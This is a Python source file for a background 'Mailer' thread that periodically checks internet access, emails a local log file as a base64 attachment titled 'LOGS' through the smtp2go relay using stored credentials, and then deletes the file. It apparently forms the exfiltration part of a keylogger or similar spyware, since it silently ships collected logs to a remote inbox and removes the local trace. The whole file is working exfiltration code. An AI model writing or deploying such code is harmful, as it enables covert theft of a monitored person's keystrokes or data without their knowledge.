import threading
import os
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
import urllib.error
from urllib.request import urlopen
import datetime
import config as con


class Mailer(threading.Thread):
	def __init__(self ):
		threading.Thread.__init__(self)
		self.sender = con.smtp['sender']
		self.recipient = con.smtp['recipient']
		self.username = con.smtp['username']
		self.password = con.smtp['password']
		self.filename = con.file['log_file']
		
	def mail(self):
		self.msg = MIMEMultipart('mixed')
		
		self.msg['Subject'] = 'LOGS'
		self.msg['From'] = self.sender
		self.msg['To'] = self.recipient
		mb = MIMEBase('application' , "octet-stream")
		if not os.path.exists(self.filename):
			f = open(self.filename, 'a+')
			f.close()

		self.attachment = open(self.filename , 'rb')
		mb.set_payload((self.attachment).read()) 
		  
		# encode into base64 
		encoders.encode_base64(mb) 
		   
		mb.add_header('Content-Disposition', "attachment; filename= %s" % self.filename) 
		  
		# attach the instance 'mb' to instance 'msg' 
		self.msg.attach(mb) 


		mailServer = smtplib.SMTP('mail.smtp2go.com', 2525) # 8025, 587 and 25 can also be used. 
		mailServer.ehlo()
		mailServer.starttls()
		mailServer.ehlo()
		mailServer.login(self.username, self.password)
		mailServer.sendmail(self.sender, self.recipient, self.msg.as_string())
		mailServer.close()

	def __internet_on(self):
	    try:
	    	urlopen('http://216.58.192.142', timeout=1)
	    	return True
	    except: 
	    	return False
	
	def run(self):
		updated = datetime.datetime.now()
		while True:
			conn = self.__internet_on()
			now = datetime.datetime.now()
			print((abs(updated-now)).total_seconds())
			if (abs(updated-now)).total_seconds() > con.time and conn:
				
				if os.path.exists(self.filename):
					self.mail()
					os.remove(self.filename)
				else:
					print("The file does not exist")
				updated = datetime.datetime.now()
